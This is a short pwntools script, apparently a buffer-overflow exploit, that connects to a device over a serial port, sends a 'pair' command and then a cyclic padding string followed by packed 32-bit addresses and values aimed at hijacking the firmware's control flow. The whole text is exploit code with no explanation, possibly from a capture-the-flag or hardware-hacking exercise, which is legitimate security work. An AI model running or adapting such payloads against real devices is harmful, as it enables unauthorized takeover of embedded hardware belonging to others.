#!/usr/bin/python3

from pwn import *
import sys

io = serialtube(sys.argv[1], convert_newlines=False)

io.sendline(b"pair")
io.sendline(
    cyclic(20)
    + p32(0x9645)
    + p32(0x4000C000)
    + p32(0x0003FC00)
    + p32(32)
    + p32(0)
    + p32(0)
    + p32(0)
    + p32(0x8461)
)
